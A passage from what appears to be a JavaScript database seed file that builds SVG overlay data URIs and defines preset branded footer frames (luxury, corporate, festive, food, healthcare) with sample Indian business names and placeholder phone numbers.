/**
 * Helper to generate 100% exact transparent SVG overlay Data URIs matching configJson elements
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
const createSvgOverlayUri = (elementsOrConfig) => {
  let elements = [];
  if (Array.isArray(elementsOrConfig)) {
    elements = elementsOrConfig;
  } else if (elementsOrConfig?.elements && Array.isArray(elementsOrConfig.elements)) {
    elements = elementsOrConfig.elements;
  }

  if (elements.length > 0) {
    const svgShapes = elements
      .filter((el) => el.slotCategory === 'STATIC_SHAPE' || el.dynamicSlot === 'NONE' || el.dynamicSlot === 'AVATAR_CIRCLE' || el.type === 'CIRCLE')
      .map((el) => {
        const fill = encodeURIComponent(el.fillColor || 'none');
        const stroke = encodeURIComponent(el.borderColor || 'transparent');
        const strokeWidth = el.borderWidth || 0;

        if (el.type === 'CAPSULE') {
          const rx = el.height / 2;
          return `<rect x="${el.x}" y="${el.y}" width="${el.width}" height="${el.height}" rx="${rx}" fill="${fill}" stroke="${stroke}" stroke-width="${strokeWidth}"/>`;
        } else if (el.type === 'CIRCLE') {
          const cx = el.x + el.width / 2;
          const cy = el.y + (el.height || el.width) / 2;
          const r = el.width / 2;
          const circleFill = el.dynamicSlot === 'AVATAR_CIRCLE' ? 'none' : fill;
          return `<circle cx="${cx}" cy="${cy}" r="${r}" fill="${circleFill}" stroke="${stroke}" stroke-width="${strokeWidth}"/>`;
        } else {
          return `<rect x="${el.x}" y="${el.y}" width="${el.width}" height="${el.height}" fill="${fill}" stroke="${stroke}" stroke-width="${strokeWidth}"/>`;
        }
      })
      .join('');

    const svgStr = `<svg xmlns="http://www.w3.org/2000/svg" width="1080" height="1080" viewBox="0 0 1080 1080">${svgShapes}</svg>`;
    return `data:image/svg+xml;utf8,${svgStr}`;
  }

  // Fallback for simple config
  const { barFill = '#0F172A', barBorder = '#EAB308', barY = 920, barHeight = 160, isCapsule = false, hasAvatarRing = true } = elementsOrConfig || {};
  const encFill = encodeURIComponent(barFill);
  const encBorder = encodeURIComponent(barBorder);

  const barShape = isCapsule
    ? `<rect x="100" y="${barY}" width="880" height="${barHeight}" rx="${barHeight / 2}" fill="${encFill}" stroke="${encBorder}" stroke-width="3"/>`
    : `<rect x="0" y="${barY}" width="1080" height="${barHeight}" fill="${encFill}" stroke="${encBorder}" stroke-width="3"/>`;

  const avatarShape = hasAvatarRing
    ? `<circle cx="110" cy="${barY + barHeight / 2}" r="55" fill="none" stroke="${encBorder}" stroke-width="4"/>`
    : '';

  const svgStr = `<svg xmlns="http://www.w3.org/2000/svg" width="1080" height="1080" viewBox="0 0 1080 1080">${barShape}${avatarShape}</svg>`;
  return `data:image/svg+xml;utf8,${svgStr}`;
};

const createSvgPreviewUri = (elementsOrConfig) => {
  let elements = [];
  if (Array.isArray(elementsOrConfig)) {
    elements = elementsOrConfig;
  } else if (elementsOrConfig?.elements && Array.isArray(elementsOrConfig.elements)) {
    elements = elementsOrConfig.elements;
  }

  if (elements.length > 0) {
    const svgShapes = elements
      .map((el) => {
        const fill = encodeURIComponent(el.fillColor || 'none');
        const stroke = encodeURIComponent(el.borderColor || 'transparent');
        const strokeWidth = el.borderWidth || 0;

        if (el.type === 'TEXT' || el.slotCategory === 'TEXT_INPUT') {
          const fontColor = encodeURIComponent(el.fontColor || el.fillColor || '#FFFFFF');
          const fontFamily = el.fontFamily || 'sans-serif';
          const fontSize = el.fontSize || 24;
          const fontWeight = el.fontWeight || 'bold';
          const textVal = encodeURIComponent((el.iconPrefix ? `${el.iconPrefix} ` : '') + (el.text || el.defaultText || 'Sample Text'));
          const textAnchor = el.textAlign === 'center' ? 'middle' : el.textAlign === 'right' ? 'end' : 'start';
          const tx = el.textAlign === 'center' ? el.x + el.width / 2 : el.textAlign === 'right' ? el.x + el.width : el.x;
          const ty = el.y + fontSize;

          return `<text x="${tx}" y="${ty}" text-anchor="${textAnchor}" fill="${fontColor}" font-family="${fontFamily}" font-size="${fontSize}" font-weight="${fontWeight}">${textVal}</text>`;
        } else if (el.type === 'CAPSULE') {
          const rx = el.height / 2;
          return `<rect x="${el.x}" y="${el.y}" width="${el.width}" height="${el.height}" rx="${rx}" fill="${fill}" stroke="${stroke}" stroke-width="${strokeWidth}"/>`;
        } else if (el.type === 'CIRCLE') {
          const cx = el.x + el.width / 2;
          const cy = el.y + (el.height || el.width) / 2;
          const r = el.width / 2;
          const circleFill = el.dynamicSlot === 'AVATAR_CIRCLE' ? '%23475569' : fill;
          return `<circle cx="${cx}" cy="${cy}" r="${r}" fill="${circleFill}" stroke="${stroke}" stroke-width="${strokeWidth}"/>`;
        } else {
          return `<rect x="${el.x}" y="${el.y}" width="${el.width}" height="${el.height}" fill="${fill}" stroke="${stroke}" stroke-width="${strokeWidth}"/>`;
        }
      })
      .join('');

    const svgStr = `<svg xmlns="http://www.w3.org/2000/svg" width="1080" height="1080" viewBox="0 0 1080 1080">${svgShapes}</svg>`;
    return `data:image/svg+xml;utf8,${svgStr}`;
  }

  const { barFill = '#0F172A', barBorder = '#EAB308', barY = 920, barHeight = 160, isCapsule = false, hasAvatarRing = true, sampleName = 'Sample Business Name', samplePhone = '📞 +91 98765 43210' } = elementsOrConfig || {};
  const encFill = encodeURIComponent(barFill);
  const encBorder = encodeURIComponent(barBorder);

  const barShape = isCapsule
    ? `<rect x="100" y="${barY}" width="880" height="${barHeight}" rx="${barHeight / 2}" fill="${encFill}" stroke="${encBorder}" stroke-width="3"/>`
    : `<rect x="0" y="${barY}" width="1080" height="${barHeight}" fill="${encFill}" stroke="${encBorder}" stroke-width="3"/>`;

  const avatarShape = hasAvatarRing
    ? `<circle cx="110" cy="${barY + barHeight / 2}" r="50" fill="%23475569" stroke="${encBorder}" stroke-width="4"/>`
    : '';

  const textX = hasAvatarRing ? 190 : 120;
  const nameY = barY + 45;
  const phoneY = barY + 90;

  const textShapes = `<text x="${textX}" y="${nameY}" fill="%23FFFFFF" font-family="sans-serif" font-size="28" font-weight="bold">${encodeURIComponent(sampleName)}</text><text x="${textX}" y="${phoneY}" fill="${encBorder}" font-family="sans-serif" font-size="20" font-weight="bold">${encodeURIComponent(samplePhone)}</text>`;

  const svgStr = `<svg xmlns="http://www.w3.org/2000/svg" width="1080" height="1080" viewBox="0 0 1080 1080">${barShape}${avatarShape}${textShapes}</svg>`;
  return `data:image/svg+xml;utf8,${svgStr}`;
};

/**
 * Seed Master Preset Frames (30 Fresh, Ultra-Premium Vector Blueprints)
 * @param {import('@prisma/client').PrismaClient} prisma
 */
export async function seedFrames(prisma) {
  console.log('🖼️ Seeding 30 Master Ultra-Premium Categorized Vector Frames...');

  const masterFrames = [
    // 1. Luxury & Royal: Regal Gold Crest
    {
      id: 'frame-regal-gold-crest',
      title: 'Regal Gold Crest Luxury Frame',
      description: 'Polished 24K gold border trim with dark onyx ribbon for high-end luxury brands and jewellers.',
      isActive: true,
      configJson: {
        category: 'LUXURY',
        elements: [
          { id: 'el_bar_bg', type: 'RECTANGLE', slotCategory: 'STATIC_SHAPE', x: 0, y: 930, width: 1080, height: 150, fillColor: '#0A0A0B', borderColor: '#F59E0B', borderWidth: 3, dynamicSlot: 'NONE' },
          { id: 'el_logo_box', type: 'RECTANGLE', slotCategory: 'IMAGE_SLOT', x: 35, y: 35, width: 120, height: 120, fillColor: '#FFFFFF', borderColor: '#F59E0B', borderWidth: 2, borderRadius: 16, dynamicSlot: 'LOGO_BOX' },
          { id: 'el_avatar_ring', type: 'CIRCLE', slotCategory: 'IMAGE_SLOT', dynamicSlot: 'AVATAR_CIRCLE', x: 45, y: 940, width: 130, height: 130, fillColor: '#18181B', borderColor: '#F59E0B', borderWidth: 4 },
          { id: 'el_biz_name', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'BUSINESS_NAME', text: 'Royal Crest Luxury Lifestyle', x: 200, y: 955, width: 500, height: 40, fontSize: 28, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FEF08A', textAlign: 'left' },
          { id: 'el_phone', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'PHONE', iconPrefix: '👑', text: '+91 98765 00001', x: 720, y: 955, width: 320, height: 40, fontSize: 22, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#F59E0B', textAlign: 'right' },
          { id: 'el_address', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'ADDRESS', text: 'Heritage Galleria, MG Road, Bangalore', x: 200, y: 1005, width: 840, height: 30, fontSize: 16, fontFamily: 'Plus Jakarta Sans', fontWeight: 'normal', fontColor: '#E4E4E7', textAlign: 'left' },
        ],
      },
    },

    // 2. Luxury & Royal: Diamond Platinum Royale
    {
      id: 'frame-diamond-platinum',
      title: 'Diamond Platinum Solitaire Frame',
      description: 'Luminous platinum silver & sapphire ribbon tailored for fine diamond jewelry and luxury watches.',
      isActive: true,
      configJson: {
        category: 'LUXURY',
        elements: [
          { id: 'el_bar_bg', type: 'RECTANGLE', slotCategory: 'STATIC_SHAPE', x: 30, y: 920, width: 1020, height: 135, fillColor: '#0F172A', borderColor: '#93C5FD', borderWidth: 2, borderRadius: 18, dynamicSlot: 'NONE' },
          { id: 'el_avatar_ring', type: 'CIRCLE', slotCategory: 'IMAGE_SLOT', dynamicSlot: 'AVATAR_CIRCLE', x: 60, y: 935, width: 105, height: 105, fillColor: '#1E293B', borderColor: '#60A5FA', borderWidth: 3 },
          { id: 'el_biz_name', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'BUSINESS_NAME', text: 'Solitaire Diamonds & Gems', x: 190, y: 945, width: 500, height: 38, fontSize: 26, fontFamily: 'Cinzel', fontWeight: 'bold', fontColor: '#FFFFFF', textAlign: 'left' },
          { id: 'el_phone', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'PHONE', iconPrefix: '💎', text: '+91 99887 76655', x: 190, y: 990, width: 450, height: 32, fontSize: 20, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#93C5FD', textAlign: 'left' },
        ],
      },
    },

    // 3. Luxury & Royal: Emerald Crown Royale
    {
      id: 'frame-emerald-crown',
      title: 'Emerald Crown Royale Overlay',
      description: 'Deep royal emerald green with polished champagne brass borders for prestigious brands.',
      isActive: true,
      configJson: {
        category: 'LUXURY',
        elements: [
          { id: 'el_bar_bg', type: 'RECTANGLE', slotCategory: 'STATIC_SHAPE', x: 0, y: 925, width: 1080, height: 155, fillColor: '#064E3B', borderColor: '#F59E0B', borderWidth: 3, dynamicSlot: 'NONE' },
          { id: 'el_avatar_ring', type: 'CIRCLE', slotCategory: 'IMAGE_SLOT', dynamicSlot: 'AVATAR_CIRCLE', x: 50, y: 940, width: 125, height: 125, fillColor: '#022C22', borderColor: '#F59E0B', borderWidth: 4 },
          { id: 'el_biz_name', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'BUSINESS_NAME', text: 'Emerald Crown Capital & Realty', x: 205, y: 955, width: 550, height: 42, fontSize: 28, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#ECFDF5', textAlign: 'left' },
          { id: 'el_phone', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'PHONE', iconPrefix: '📞', text: '+91 91234 56780', x: 205, y: 1005, width: 500, height: 35, fontSize: 21, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FDE68A', textAlign: 'left' },
        ],
      },
    },

    // 4. Corporate & Tech: Cyber Slate Minimal
    {
      id: 'frame-cyber-minimal',
      title: 'Cyber Slate Minimal Pill',
      description: 'Futuristic floating pill container with vibrant cyan neon accents for modern software companies.',
      isActive: true,
      configJson: {
        category: 'CORPORATE',
        elements: [
          { id: 'el_pill_bg', type: 'CAPSULE', slotCategory: 'STATIC_SHAPE', x: 60, y: 935, width: 960, height: 110, fillColor: '#090D16', borderColor: '#06B6D4', borderWidth: 2, dynamicSlot: 'NONE' },
          { id: 'el_biz_name', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'BUSINESS_NAME', text: 'Quantex Cloud Systems', x: 110, y: 955, width: 480, height: 35, fontSize: 26, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#22D3EE', textAlign: 'left' },
          { id: 'el_phone', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'PHONE', iconPrefix: '⚡', text: '+91 98765 11122', x: 620, y: 955, width: 360, height: 35, fontSize: 22, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#E0F2FE', textAlign: 'right' },
        ],
      },
    },

    // 5. Corporate & Tech: Executive Navy Suite
    {
      id: 'frame-executive-corporate',
      title: 'Executive Corporate Navy Bar',
      description: 'Crisp corporate navy banner with dual logo corners and clean typography for consulting firms.',
      isActive: true,
      configJson: {
        category: 'CORPORATE',
        elements: [
          { id: 'el_bar_bg', type: 'RECTANGLE', slotCategory: 'STATIC_SHAPE', x: 0, y: 935, width: 1080, height: 145, fillColor: '#0F172A', borderColor: '#38BDF8', borderWidth: 2, dynamicSlot: 'NONE' },
          { id: 'el_logo_box', type: 'RECTANGLE', slotCategory: 'IMAGE_SLOT', x: 35, y: 35, width: 120, height: 120, fillColor: '#FFFFFF', borderColor: '#CBD5E1', borderWidth: 2, borderRadius: 12, dynamicSlot: 'LOGO_BOX' },
          { id: 'el_avatar_ring', type: 'CIRCLE', slotCategory: 'IMAGE_SLOT', dynamicSlot: 'AVATAR_CIRCLE', x: 40, y: 948, width: 120, height: 120, fillColor: '#1E293B', borderColor: '#38BDF8', borderWidth: 3 },
          { id: 'el_biz_name', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'BUSINESS_NAME', text: 'Apex Global Advisory', x: 185, y: 960, width: 500, height: 38, fontSize: 28, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FFFFFF', textAlign: 'left' },
          { id: 'el_phone', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'PHONE', text: '+91 98222 33344', x: 710, y: 960, width: 330, height: 38, fontSize: 22, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#38BDF8', textAlign: 'right' },
          { id: 'el_address', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'ADDRESS', text: 'Tech Park Towers, Sector 62, Noida', x: 710, y: 1005, width: 330, height: 28, fontSize: 15, fontFamily: 'Plus Jakarta Sans', fontWeight: 'normal', fontColor: '#94A3B8', textAlign: 'right' },
        ],
      },
    },

    // 6. Corporate & Tech: Fintech Mint Pill
    {
      id: 'frame-fintech-gradient',
      title: 'Fintech Mint Flow Capsule',
      description: 'Modern midnight purple with neon mint badge for digital payment gateways and crypto platforms.',
      isActive: true,
      configJson: {
        category: 'CORPORATE',
        elements: [
          { id: 'el_pill_bg', type: 'CAPSULE', slotCategory: 'STATIC_SHAPE', x: 70, y: 935, width: 940, height: 110, fillColor: '#18022E', borderColor: '#10B981', borderWidth: 2, dynamicSlot: 'NONE' },
          { id: 'el_biz_name', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'BUSINESS_NAME', text: 'PayPulse Fintech Solutions', x: 120, y: 955, width: 460, height: 35, fontSize: 26, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#34D399', textAlign: 'left' },
          { id: 'el_phone', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'PHONE', iconPrefix: '💳', text: '+91 90000 88877', x: 600, y: 955, width: 370, height: 35, fontSize: 22, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FFFFFF', textAlign: 'right' },
        ],
      },
    },

    // 7. Corporate & Tech: AI Aurora Glow
    {
      id: 'frame-ai-aurora-glow',
      title: 'AI Aurora Violet Glow Bar',
      description: 'Electric violet and magenta gradient frame for artificial intelligence agencies and creative studios.',
      isActive: true,
      configJson: {
        category: 'CORPORATE',
        elements: [
          { id: 'el_bar_bg', type: 'RECTANGLE', slotCategory: 'STATIC_SHAPE', x: 40, y: 925, width: 1000, height: 130, fillColor: '#1E1B4B', borderColor: '#C084FC', borderWidth: 2, borderRadius: 16, dynamicSlot: 'NONE' },
          { id: 'el_avatar_ring', type: 'CIRCLE', slotCategory: 'IMAGE_SLOT', dynamicSlot: 'AVATAR_CIRCLE', x: 70, y: 940, width: 100, height: 100, fillColor: '#2E1065', borderColor: '#C084FC', borderWidth: 3 },
          { id: 'el_biz_name', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'BUSINESS_NAME', text: 'Cognitive AI Innovations', x: 195, y: 950, width: 500, height: 38, fontSize: 26, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#F3E8FF', textAlign: 'left' },
          { id: 'el_phone', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'PHONE', iconPrefix: '✨', text: '+91 97777 44411', x: 195, y: 995, width: 450, height: 32, fontSize: 20, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#E9D5FF', textAlign: 'left' },
        ],
      },
    },

    // 8. Festive & Cultural: Traditional Festive Marigold
    {
      id: 'frame-festive-marigold',
      title: 'Traditional Festive Marigold Ribbon',
      description: 'Auspicious crimson red and marigold garland ribbon for Diwali, Ganesh Utsav, and Puja wishes.',
      isActive: true,
      configJson: {
        category: 'FESTIVAL',
        elements: [
          { id: 'el_bar_bg', type: 'RECTANGLE', slotCategory: 'STATIC_SHAPE', x: 0, y: 920, width: 1080, height: 160, fillColor: '#881337', borderColor: '#F59E0B', borderWidth: 4, dynamicSlot: 'NONE' },
          { id: 'el_avatar_ring', type: 'CIRCLE', slotCategory: 'IMAGE_SLOT', dynamicSlot: 'AVATAR_CIRCLE', x: 50, y: 935, width: 130, height: 130, fillColor: '#4C0519', borderColor: '#F59E0B', borderWidth: 4 },
          { id: 'el_biz_name', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'BUSINESS_NAME', text: 'Shree Balaji Heritage Sweets', x: 210, y: 950, width: 550, height: 45, fontSize: 30, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FEF08A', textAlign: 'left' },
          { id: 'el_phone', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'PHONE', iconPrefix: '🪔', text: '+91 98200 12345', x: 210, y: 1005, width: 500, height: 35, fontSize: 22, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FFFFFF', textAlign: 'left' },
        ],
      },
    },

    // 9. Festive & Cultural: Deep Diwali Vermillion
    {
      id: 'frame-diwali-vermillion',
      title: 'Diwali Sparkle Gold Vermillion',
      description: 'Lustrous festive vermillion with floating Diya badges and sparkling celebration motifs.',
      isActive: true,
      configJson: {
        category: 'FESTIVAL',
        elements: [
          { id: 'el_pill_bg', type: 'CAPSULE', slotCategory: 'STATIC_SHAPE', x: 80, y: 930, width: 920, height: 120, fillColor: '#7C2D12', borderColor: '#FBBF24', borderWidth: 3, dynamicSlot: 'NONE' },
          { id: 'el_avatar_ring', type: 'CIRCLE', slotCategory: 'IMAGE_SLOT', dynamicSlot: 'AVATAR_CIRCLE', x: 110, y: 940, width: 100, height: 100, fillColor: '#431407', borderColor: '#FBBF24', borderWidth: 3 },
          { id: 'el_biz_name', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'BUSINESS_NAME', text: 'Aura Festive Emporium', x: 235, y: 955, width: 480, height: 38, fontSize: 26, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FEF3C7', textAlign: 'left' },
          { id: 'el_phone', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'PHONE', iconPrefix: '✨', text: '+91 98111 22334', x: 235, y: 998, width: 450, height: 32, fontSize: 20, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FFFFFF', textAlign: 'left' },
        ],
      },
    },

    // 10. Festive & Cultural: Crescent Teal Ramzan
    {
      id: 'frame-crescent-teal-ramzan',
      title: 'Crescent Moon Teal Festive Frame',
      description: 'Serene Islamic geometric teal ribbon with golden crescent star crest for Eid celebrations.',
      isActive: true,
      configJson: {
        category: 'FESTIVAL',
        elements: [
          { id: 'el_bar_bg', type: 'RECTANGLE', slotCategory: 'STATIC_SHAPE', x: 0, y: 925, width: 1080, height: 155, fillColor: '#0F766E', borderColor: '#F59E0B', borderWidth: 3, dynamicSlot: 'NONE' },
          { id: 'el_avatar_ring', type: 'CIRCLE', slotCategory: 'IMAGE_SLOT', dynamicSlot: 'AVATAR_CIRCLE', x: 45, y: 940, width: 125, height: 125, fillColor: '#134E4A', borderColor: '#F59E0B', borderWidth: 4 },
          { id: 'el_biz_name', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'BUSINESS_NAME', text: 'Noorani Perfumers & Attar', x: 200, y: 955, width: 550, height: 42, fontSize: 28, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#CCFBF1', textAlign: 'left' },
          { id: 'el_phone', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'PHONE', iconPrefix: '🌙', text: '+91 97654 32109', x: 200, y: 1005, width: 500, height: 35, fontSize: 21, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FFFFFF', textAlign: 'left' },
        ],
      },
    },

    // 11. Festive & Cultural: Patriotic Tricolor Ribbon
    {
      id: 'frame-patriotic-tricolor',
      title: 'Tricolor Pride Republic Ribbon',
      description: 'Saffron, white and green civic celebration footer for Republic Day and Independence Day.',
      isActive: true,
      configJson: {
        category: 'FESTIVAL',
        elements: [
          { id: 'el_bar_bg', type: 'RECTANGLE', slotCategory: 'STATIC_SHAPE', x: 0, y: 925, width: 1080, height: 155, fillColor: '#C2410C', borderColor: '#FFFFFF', borderWidth: 3, dynamicSlot: 'NONE' },
          { id: 'el_avatar_ring', type: 'CIRCLE', slotCategory: 'IMAGE_SLOT', dynamicSlot: 'AVATAR_CIRCLE', x: 45, y: 940, width: 125, height: 125, fillColor: '#15803D', borderColor: '#FFFFFF', borderWidth: 4 },
          { id: 'el_biz_name', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'BUSINESS_NAME', text: 'Desh Seva Public Trust', x: 200, y: 955, width: 550, height: 42, fontSize: 30, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FFFFFF', textAlign: 'left' },
          { id: 'el_phone', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'PHONE', iconPrefix: '🇮🇳', text: '+91 95555 12345', x: 200, y: 1005, width: 500, height: 35, fontSize: 22, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FEF08A', textAlign: 'left' },
        ],
      },
    },

    // 12. Food & Dining: Artisan Espresso Bistro
    {
      id: 'frame-artisan-bistro',
      title: 'Artisan Espresso Bistro Ribbon',
      description: 'Warm roasted coffee brown and buttery gold accents for cafes, fine dining, and restro-bars.',
      isActive: true,
      configJson: {
        category: 'FOOD',
        elements: [
          { id: 'el_bar_bg', type: 'RECTANGLE', slotCategory: 'STATIC_SHAPE', x: 0, y: 920, width: 1080, height: 160, fillColor: '#451A03', borderColor: '#F59E0B', borderWidth: 2, dynamicSlot: 'NONE' },
          { id: 'el_avatar_ring', type: 'CIRCLE', slotCategory: 'IMAGE_SLOT', dynamicSlot: 'AVATAR_CIRCLE', x: 50, y: 935, width: 130, height: 130, fillColor: '#270E02', borderColor: '#F59E0B', borderWidth: 4 },
          { id: 'el_biz_name', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'BUSINESS_NAME', text: 'The Rustic Oak Cafe & Bistro', x: 210, y: 950, width: 550, height: 45, fontSize: 30, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FDE68A', textAlign: 'left' },
          { id: 'el_phone', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'PHONE', iconPrefix: '☕', text: '+91 94444 88899', x: 210, y: 1005, width: 500, height: 35, fontSize: 22, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FFFFFF', textAlign: 'left' },
        ],
      },
    },

    // 13. Food & Dining: Strawberry Patisserie Pill
    {
      id: 'frame-strawberry-patisserie',
      title: 'Sweet Strawberry Patisserie Pill',
      description: 'Pastel berry rose and creamy chocolate capsule card for bakeries, cupcakes, and cake shops.',
      isActive: true,
      configJson: {
        category: 'FOOD',
        elements: [
          { id: 'el_pill_bg', type: 'CAPSULE', slotCategory: 'STATIC_SHAPE', x: 90, y: 925, width: 900, height: 120, fillColor: '#831843', borderColor: '#F472B6', borderWidth: 2, dynamicSlot: 'NONE' },
          { id: 'el_avatar_ring', type: 'CIRCLE', slotCategory: 'IMAGE_SLOT', dynamicSlot: 'AVATAR_CIRCLE', x: 120, y: 935, width: 100, height: 100, fillColor: '#500724', borderColor: '#F472B6', borderWidth: 3 },
          { id: 'el_biz_name', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'BUSINESS_NAME', text: 'Velvet Frost Artisanal Bakery', x: 245, y: 950, width: 500, height: 40, fontSize: 26, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FCE7F3', textAlign: 'left' },
          { id: 'el_phone', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'PHONE', iconPrefix: '🎂', text: '+91 93333 44444', x: 245, y: 995, width: 450, height: 35, fontSize: 20, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FFFFFF', textAlign: 'left' },
        ],
      },
    },

    // 14. Food & Dining: Street Spice Fiesta
    {
      id: 'frame-street-spice-fiesta',
      title: 'Street Spice Fast Food Punch',
      description: 'Fiery chili crimson and mustard yellow banner for burger joints, pizza spots, and street eats.',
      isActive: true,
      configJson: {
        category: 'FOOD',
        elements: [
          { id: 'el_bar_bg', type: 'RECTANGLE', slotCategory: 'STATIC_SHAPE', x: 0, y: 925, width: 1080, height: 155, fillColor: '#991B1B', borderColor: '#FACC15', borderWidth: 3, dynamicSlot: 'NONE' },
          { id: 'el_avatar_ring', type: 'CIRCLE', slotCategory: 'IMAGE_SLOT', dynamicSlot: 'AVATAR_CIRCLE', x: 45, y: 940, width: 125, height: 125, fillColor: '#450A0A', borderColor: '#FACC15', borderWidth: 4 },
          { id: 'el_biz_name', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'BUSINESS_NAME', text: 'Spice Nation Burgers & Shakes', x: 200, y: 955, width: 550, height: 42, fontSize: 28, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FEF08A', textAlign: 'left' },
          { id: 'el_phone', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'PHONE', iconPrefix: '🍔', text: '+91 91111 55566', x: 200, y: 1005, width: 500, height: 35, fontSize: 22, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FFFFFF', textAlign: 'left' },
        ],
      },
    },

    // 15. Healthcare & Wellness: MedCare Clinical Cyan
    {
      id: 'frame-medcare-pro',
      title: 'MedCare Clinical Cyan Banner',
      description: 'Sterile healthcare cyan and deep sea blue banner for clinics, hospitals, and diagnostic labs.',
      isActive: true,
      configJson: {
        category: 'HEALTHCARE',
        elements: [
          { id: 'el_bar_bg', type: 'RECTANGLE', slotCategory: 'STATIC_SHAPE', x: 0, y: 930, width: 1080, height: 150, fillColor: '#0E7490', borderColor: '#E0F2FE', borderWidth: 2, dynamicSlot: 'NONE' },
          { id: 'el_avatar_ring', type: 'CIRCLE', slotCategory: 'IMAGE_SLOT', dynamicSlot: 'AVATAR_CIRCLE', x: 40, y: 945, width: 120, height: 120, fillColor: '#155E75', borderColor: '#FFFFFF', borderWidth: 4 },
          { id: 'el_biz_name', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'BUSINESS_NAME', text: 'CareWell Multi-Specialty Clinic', x: 190, y: 955, width: 550, height: 40, fontSize: 28, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FFFFFF', textAlign: 'left' },
          { id: 'el_phone', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'PHONE', iconPrefix: '🏥', text: '+91 90000 11223', x: 190, y: 1005, width: 450, height: 35, fontSize: 20, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#BAE6FD', textAlign: 'left' },
        ],
      },
    },

    // 16. Healthcare & Wellness: Ayurveda Herb Olive
    {
      id: 'frame-ayurveda-herbal',
      title: 'Ayurveda Herbal Wellness Bar',
      description: 'Earthy sage olive and warm sandalwood border for naturopathy, ayurveda, and yoga retreats.',
      isActive: true,
      configJson: {
        category: 'HEALTHCARE',
        elements: [
          { id: 'el_bar_bg', type: 'RECTANGLE', slotCategory: 'STATIC_SHAPE', x: 0, y: 925, width: 1080, height: 155, fillColor: '#14532D', borderColor: '#86EFAC', borderWidth: 2, dynamicSlot: 'NONE' },
          { id: 'el_avatar_ring', type: 'CIRCLE', slotCategory: 'IMAGE_SLOT', dynamicSlot: 'AVATAR_CIRCLE', x: 45, y: 940, width: 125, height: 125, fillColor: '#052E16', borderColor: '#86EFAC', borderWidth: 4 },
          { id: 'el_biz_name', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'BUSINESS_NAME', text: 'Sanjeevani Ayurvedic Wellness', x: 200, y: 955, width: 550, height: 42, fontSize: 28, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#DCFCE7', textAlign: 'left' },
          { id: 'el_phone', type: 'TEXT', slotCategory: 'TEXT_INPUT', dynamicSlot: 'PHONE', iconPrefix: '🌿', text: '+91 92222 66778', x: 200, y: 1005, width: 500, height: 35, fontSize: 21, fontFamily: 'Space Grotesk', fontWeight: 'bold', fontColor: '#FFFFFF', textAlign: 'left' },
